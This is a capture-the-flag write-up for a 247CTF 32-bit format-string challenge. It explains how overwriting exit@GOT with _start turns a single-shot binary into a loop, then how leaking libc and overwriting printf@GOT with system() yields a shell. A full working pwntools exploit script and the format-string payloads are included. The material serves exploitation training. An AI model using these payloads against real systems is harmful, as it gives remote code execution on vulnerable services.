# Less Confused Environment Write - 247CTF PWN Challenge

## Challenge Info
- **Name**: Less confused environment write
- **Category**: PWN
- **Remote**: `tcp://d153c17062e9c8c8.247ctf.com:50304`
- **Description**: "Can you abuse our less confused environment service to obtain a write primitive?"
- **Series**: Confused Environment (3/3)

## Flag
```
247CTF{XXXXXXXXXXXXXXXXXXXX}
```

---

## Binary Analysis

No binary provided - all analysis done remotely through format string probing.

- **Architecture**: 32-bit (i386), dynamically linked, no PIE
- **Input**: `fgets(buf, 64, stdin)` - 63-byte buffer limit
- **Vulnerability**: Format string - user input passed directly to printf (or `__printf_chk`)
- **Key difference from "confused environment write"**: **Single-shot** - no loop, program prints "Goodbye!" and exits

### Program Behavior
```
Argh, I can't see who you are!
What's your name again?
> <user_input>             ← format string vuln
Oh, that's right! Welcome back <format_string_output>!
Goodbye!                   ← exits (no loop!)
```

### GOT Layout

| GOT Address | Function | Notes |
|---|---|---|
| `0x804a00c` | setbuf | resolved |
| `0x804a010` | printf | offset 0x50b60, used for libc leak |
| `0x804a014` | unknown | resolved |
| `0x804a018` | fgets | resolved |
| `0x804a01c` | puts | resolved |
| `0x804a020` | **exit** | unresolved until called at end |
| `0x804a024` | getenv | resolved |

**Libc**: glibc 2.27 (same as confused environment write)

---

## Vulnerability

Same format string vulnerability as the other challenges in the series:
- **Stack offset 11**: user input appears on stack at this offset
- **%n/%hn/%hhn writes work**: no `__printf_chk` restriction on writes
- **Single-shot constraint**: only one format string input before exit

---

## Exploitation

### Challenge: Single-Shot Format String

Unlike the "confused environment write" challenge which loops (allowing leak in iteration 1, overwrite in iteration 2), this binary exits after one input. This means:

1. Can't leak libc and use it in the same payload (leak value is unknown at construction time)
2. Can't do the `fgets@GOT → system` trick (needs loop for the overwritten fgets to trigger)

### Solution: Create a Loop by Overwriting `exit@GOT`

Key insight: `exit()` at GOT 0x804a020 is **unresolved** when our format string executes (it hasn't been called yet). We can overwrite it with `_start` (0x8048440) to make the program restart instead of exiting.

### 4-Shot Exploit Chain

| Shot | Action | Result |
|------|--------|--------|
| 1 | Overwrite `exit@GOT` → `_start` (0x8048440) | Program loops instead of exiting |
| 2 | Leak `printf@GOT` (0x804a010) via `%11$s` | Get libc base, compute system() |
| 3 | Overwrite `printf@GOT` → `system()` | Next printf call becomes system |
| 4 | Send `sh` | `printf("sh")` → `system("sh")` → **shell!** |

### Why Overwrite printf@GOT (not fgets@GOT)?

In the "write" challenge, `fgets@GOT → system` worked because the buffer persisted between loop iterations (same stack frame). Here, each "restart" via `_start` creates a fresh stack frame, so the buffer is empty.

Instead, we overwrite `printf@GOT → system`. After restart:
1. `fgets(buf)` reads our input `"sh"` into `buf`
2. `printf(buf)` → `system("sh")` → **shell spawns!**

### Payload Details

**Shot 1** - Two `%hn` writes to overwrite exit@GOT with 0x8048440:
```
p32(0x804a020) + p32(0x804a022) + "%2044c%12$hn%31804c%11$hn"
= 33 bytes (within 63-byte limit)
```

**Shot 3** - Two `%hn` writes to overwrite printf@GOT with system():
```
p32(0x804a010) + p32(0x804a012) + "%Nc%??$hn%Mc%??$hn"
= ~34 bytes (dynamic based on system() address)
```

---

## Exploit Code

```bash
python3 solve.py          # LOCAL
python3 solve.py REMOTE   # REMOTE
python3 solve.py GDB      # DEBUGGING
```

```python
#!/usr/bin/env python3
from pwn import *
import time
import re

# === CONFIGURATION ===
BINARY = "./chall"
HOST = 'd153c17062e9c8c8.247ctf.com'
PORT = 50304

context.log_level = 'info'

# Binary addresses (no PIE)
EXIT_GOT     = 0x804a020
PRINTF_GOT   = 0x804a010
START_ADDR   = 0x8048440

# Libc offsets (glibc 2.27)
PRINTF_OFFSET = 0x50b60
SYSTEM_OFFSET = 0x3cd10

def get_process():
    if args.REMOTE:
        return remote(HOST, PORT, timeout=15)
    elif args.GDB:
        return gdb.debug(BINARY, gdbscript='b *main\ncontinue\n')
    else:
        return process(BINARY)

def build_hn_overwrite(target_addr, value, start_offset=11):
    """Build format string payload to write 4-byte value using two %hn writes."""
    lo = value & 0xffff
    hi = (value >> 16) & 0xffff
    addr_lo = p32(target_addr)
    addr_hi = p32(target_addr + 2)
    initial = 8

    if hi <= lo:
        pad1 = (hi - initial) % 0x10000
        pad2 = (lo - hi) % 0x10000
        fmt = b''
        if pad1 > 0: fmt += f'%{pad1}c'.encode()
        fmt += f'%{start_offset+1}$hn'.encode()
        if pad2 > 0: fmt += f'%{pad2}c'.encode()
        fmt += f'%{start_offset}$hn'.encode()
    else:
        pad1 = (lo - initial) % 0x10000
        pad2 = (hi - lo) % 0x10000
        fmt = b''
        if pad1 > 0: fmt += f'%{pad1}c'.encode()
        fmt += f'%{start_offset}$hn'.encode()
        if pad2 > 0: fmt += f'%{pad2}c'.encode()
        fmt += f'%{start_offset+1}$hn'.encode()

    return addr_lo + addr_hi + fmt

def exploit():
    io = get_process()
    time.sleep(0.3)
    io.recvuntil(b'again?\n', timeout=5)

    # SHOT 1: Overwrite exit@GOT → _start (create loop)
    log.info("Shot 1: exit@GOT → _start")
    io.sendline(build_hn_overwrite(EXIT_GOT, START_ADDR))
    io.recvuntil(b'again?\n', timeout=15)
    log.success("Program looped!")

    # SHOT 2: Leak libc via printf@GOT
    log.info("Shot 2: Leaking libc")
    io.sendline(p32(PRINTF_GOT) + b'XXXX%11$s')
    resp = io.recvuntil(b'again?\n', timeout=15)
    idx = resp.find(b'XXXX')
    printf_addr = u32(resp[idx+4:idx+8])
    libc_base = printf_addr - PRINTF_OFFSET
    system_addr = libc_base + SYSTEM_OFFSET
    log.info(f"  libc base = {hex(libc_base)}, system = {hex(system_addr)}")

    # SHOT 3: Overwrite printf@GOT → system
    log.info("Shot 3: printf@GOT → system")
    io.sendline(build_hn_overwrite(PRINTF_GOT, system_addr))
    time.sleep(3)
    try: io.recv(65536, timeout=5)
    except: pass

    # SHOT 4: Send "sh" → printf("sh") → system("sh") → shell!
    log.info("Shot 4: sending 'sh'")
    io.sendline(b'sh')
    time.sleep(1)

    io.sendline(b'cat flag* /flag* 2>/dev/null; ls -la')
    time.sleep(2)
    out = io.recvrepeat(timeout=5)
    if b'247CTF' in out:
        match = re.search(rb'247CTF\{[^}]+\}', out)
        if match:
            log.success(f"FLAG: {match.group(0).decode()}")
            with open('flag.txt', 'w') as f:
                f.write('247CTF{XXXXXXXXXXXXXXXXXXXX}\n')

    io.interactive()

if __name__ == '__main__':
    exploit()
```

---

## Key Takeaways

1. **Single-shot to multi-shot**: Overwriting `exit@GOT` → `_start` creates arbitrary loops from a single-shot binary. This is a powerful technique for any format string challenge without a natural loop.

2. **Unresolved GOT entries are targets**: `exit@GOT` was unresolved (PLT stub) at the time of our format string. We wrote a fixed, known address (`_start` = 0x8048440, no PIE), requiring zero ASLR knowledge.

3. **printf@GOT → system is better than fgets@GOT → system** when the stack is refreshed between iterations (program restart vs loop). The input goes through `fgets → printf`, so overwriting printf gives direct control.

4. **Staged exploitation**: When a single format string can't do everything (leak + compute + write), split into multiple stages using a GOT-based loop.

5. **"LESS" hint**: The "less confused" name hints that the binary is a simpler version (single-shot instead of loop), making it paradoxically harder to exploit.

---

## Confused Environment Series Summary

| # | Challenge | Technique | Shots |
|---|-----------|-----------|-------|
| 1 | Confused env **read** | `%79$s` leaks FLAG env var | 1 |
| 2 | Confused env **write** | fgets@GOT → system (natural loop) | 2 |
| 3 | **Less** confused env write | exit@GOT → _start + printf@GOT → system | 4 |

---

## Files

- `solve.py` - Working exploit
- `flag.txt` - Captured flag (censored)
- `WRITEUP.md` - This writeup
